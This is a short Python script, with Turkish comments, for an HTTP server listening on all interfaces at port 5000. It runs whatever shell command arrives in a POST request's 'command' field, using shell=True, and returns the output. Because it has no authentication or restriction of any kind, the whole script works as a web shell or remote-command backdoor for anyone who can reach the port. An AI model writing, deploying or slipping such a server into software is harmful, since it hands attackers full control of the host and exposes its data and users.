from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
import urllib.parse
import subprocess

HOST = "0.0.0.0"
PORT = 5000

import subprocess

import subprocess

def run_command_linux(cmd: str) -> str:
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            encoding="utf-8",   # UTF-8 olarak oku
            errors="ignore"     # Sorunlu karakterleri atla
        )
        return (result.stdout or "") + (result.stderr or "")
    except Exception as e:
        return f"Error running command: {e}"



class SimpleHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        output = ""
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            data = urllib.parse.parse_qs(post_data.decode('utf-8'))
            cmd = data.get('command', [""])[0]

            if cmd:
                output = run_command_linux(cmd)
                
            else:
                output = "No command provided"

        except Exception as e:
            output = f"Error processing request: {e}"

        # HTTP response
        try:
            response_bytes = str(output).encode('utf-8')
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.send_header("Content-Length", str(len(response_bytes)))
            self.end_headers()
            self.wfile.write(response_bytes)
            self.wfile.flush()
        except Exception as e:
            print("Error sending response:", e)

# ThreadingHTTPServer ile aynı anda birden fazla request işlenebilir ve server kapanmaz
httpd = ThreadingHTTPServer((HOST, PORT), SimpleHandler)
print(f"[HTTP] Sunucu çalışıyor: http://{HOST}:{PORT}")
httpd.serve_forever()
